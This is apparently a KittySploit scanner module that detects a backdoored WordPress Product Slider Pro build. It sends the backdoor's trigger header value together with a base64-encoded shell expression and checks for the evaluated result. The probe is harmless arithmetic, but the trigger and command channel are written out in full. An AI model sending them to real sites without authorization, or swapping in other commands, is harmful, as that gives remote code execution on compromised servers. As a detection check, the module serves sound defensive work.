#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""WordPress Product Slider Pro for WooCommerce - Supply Chain Backdoor RCE"""

import base64
import secrets

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        "name": "WordPress Product Slider Pro - Supply Chain Backdoor RCE",
        "description": (
            "Compromised Product Slider Pro builds execute attacker-controlled "
            "expressions via X-Cache-Status/X-Cache-Key headers."
        ),
        "author": ["KittySploit Team"],
        "severity": "critical",
        "cve": "CVE-2026-49777",
        "tags": [
            "web", "scanner", "cve", "cve2026", "vuln",
            "wordpress", "wp-plugin", "backdoor", "rce", "vkev",
        ],
        "agent": {
            "risk": "active",
            "effects": ["network_probe"],
            "expected_requests": 1,
            "reversible": True,
            "approval_required": False,
            "produces": ["tech_hints", "risk_signals", "endpoints"],
            "cost": 1.0,
            "noise": 0.2,
            "value": 1.0,
        },
        "references": [
            "https://patchstack.com/articles/critical-supply-chain-compromise-in-smart-slider-3-pro-full-malware-analysis/",
            "https://nvd.nist.gov/vuln/detail/CVE-2026-49777",
        ],
    }

    def run(self):
        a = secrets.randbelow(90000) + 10000
        b = secrets.randbelow(90000) + 10000
        expected = str(a + b)
        expr = f"expr {a} + {b}"
        key = base64.b64encode(expr.encode()).decode()
        r = self.http_request(
            method="GET",
            path="/",
            headers={
                "X-Cache-Status": "nw9xQmK4",
                "X-Cache-Key": key,
            },
            allow_redirects=False,
        )
        if not r or r.status_code != 200:
            return False
        body = (r.text or "").strip()
        ctype = (r.headers.get("Content-Type") or r.headers.get("content-type") or "").lower()
        if "text/plain" not in ctype:
            return False
        if expected not in body:
            return False
        self.set_info(
            severity="critical",
            cve="CVE-2026-49777",
            reason="Product Slider Pro backdoor evaluated X-Cache-Key expression",
            path="/",
            proof=expected,
            confidence="high",
        )
        return True
